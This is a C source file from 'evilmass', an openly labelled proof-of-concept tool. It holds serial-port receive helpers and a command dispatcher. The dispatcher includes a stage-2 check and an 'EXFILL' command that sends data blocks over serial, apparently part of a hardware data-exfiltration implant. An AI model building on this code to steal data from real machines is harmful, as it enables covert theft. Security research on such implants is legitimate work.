/*
evilmass - MIT License - Copyright 2020
-
David Reguera Garcia aka Dreg - dreg@fr33project.org
-
http://www.rootkit.es/
http://github.com/David-Reguera-Garcia-Dreg/
http://www.fr33project.org/
-
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
IN THE SOFTWARE.

WARNING! this is a POC, the code is CRAP
*/

#include "misc.h"
#include <LUFA/Drivers/Peripheral/Serial.h>
#include <stdio.h>
#include <LUFA/Drivers/Peripheral/Serial.h>
#define COMSRC // ONLY DEFINE THIS ONE TIME IN THE FULL PROJECT, THE OTHERS MUST BE USED ONLY: #include <comsrc.h>
#include <comsrc.h>


void flush_serial_input(void)
{
    for (int i = 0; i < 100; i++)
    {
        while (Serial_ReceiveByte() != -1) ;
    }
}

bool clear_new_line_serial(uint32_t max_tries)
{
    uint16_t byte_recv;
    uint32_t curr_max_tries;
    
    curr_max_tries = max_tries;
    do 
    {
        byte_recv = Serial_ReceiveByte();
        if (curr_max_tries > 0)
        {
            if (-1 == byte_recv)
            {
                curr_max_tries--;
                if (curr_max_tries == 0)
                {
                    return false;
                }  
            }
            else
            {
                curr_max_tries = max_tries;
            }
        }
    } while (byte_recv != '\n');
    
    return true;
}

bool recv_from_serial(unsigned char* buffer, uint32_t nbytes, uint32_t max_tries)
{
    uint32_t curr_max_tries;
    
    if (NULL == buffer || nbytes == 0)
    {
        return false;
    }
    
    for (int i = 0; i < nbytes; i++)
    {
        curr_max_tries = max_tries;
        while (!Serial_IsCharReceived())
        {
            if (curr_max_tries > 0)
            {
                curr_max_tries--;
                if (curr_max_tries == 0)
                {
                    buffer[i] = 0;
                    printf("\r\n\r\nERROR!!: time out recv from serial! bytes recv: %d, data: %s\r\n\r\n", i, buffer);
                    return false;
                }
            }
        }
        buffer[i] = (unsigned char) Serial_ReceiveByte();
    }
    return true;
}

bool recv_from_serial_until(unsigned char* buffer, 
                            uint32_t max_nbytes, 
                            unsigned char* pattern, 
                            uint32_t pattern_size, 
                            uint32_t max_tries)
{
    uint32_t curr_max_tries;
    uint32_t current_pattern_nr = 0;
    
    if (NULL == buffer || NULL == pattern || pattern_size == 0 || max_nbytes == 0)
    {
        return false;
    }
    
    for (int i = 0; i < max_nbytes; i++)
    {
        curr_max_tries = max_tries;
        while (!Serial_IsCharReceived())
        {
            if (curr_max_tries > 0)
            {
                curr_max_tries--;
                if (curr_max_tries == 0)
                {
                    return false;
                }
            }
        }
        buffer[i] = (unsigned char) Serial_ReceiveByte();
        if (buffer[i] == pattern[current_pattern_nr])
        {
            current_pattern_nr++;
            if (current_pattern_nr >= pattern_size)
            {
                return true;
            }
        }
        else
        {
            current_pattern_nr = 0;
        }
    }
    
    return false;
}


bool recv_new_line_from_serial(unsigned char* buffer, 
                               uint32_t max_nbytes,
                               uint32_t max_tries)
{
    return recv_from_serial_until(buffer,
                                  max_nbytes,
                                  (unsigned char*) NLS,
                                  SNLS,
                                  max_tries);
}


unsigned int send_cmd(CMD_t* cmd, void* ext)
{
    flush_serial_input();
    
    printf("\r\n%s\r\n", cmd->cmd);
  
    if (strcmp(cmd->cmd, PRLE_CMD_AM_I_IN_STAGE2) == 0)
    {
        char cmd_recv[SIZE_PRLE_CMD + 1] = { 0 };
        if (recv_from_serial((unsigned char*)cmd_recv, SIZE_PRLE_CMD, 3000))
        {
            printf("\r\nrecv_resp: %s\r\n", cmd_recv);
            if (memcmp(cmd_recv, PRLE_CMD_OK, SIZE_PRLE_CMD) == 0)
            {
                return 1;
            }
        }
    }
    else if (strcmp(cmd->cmd, PRLE_CMD_EXFILL) == 0)
    {
        Serial_SendData(cmd->opt_data, sizeof(EXFL_BLK_t));
        printf("\r\n");
    }    
    else if (strcmp(cmd->cmd, PRLE_CMD_GETRSTPKT) == 0)
    {
         if (recv_from_serial((unsigned char*)ext, 4, 3000))
         {
             printf("\r\nnr_packet_sended: %" PRIu32 "\r\n", *((uint32_t*) ext));
             return 1;
         }
    }    
    
    return 0;
}
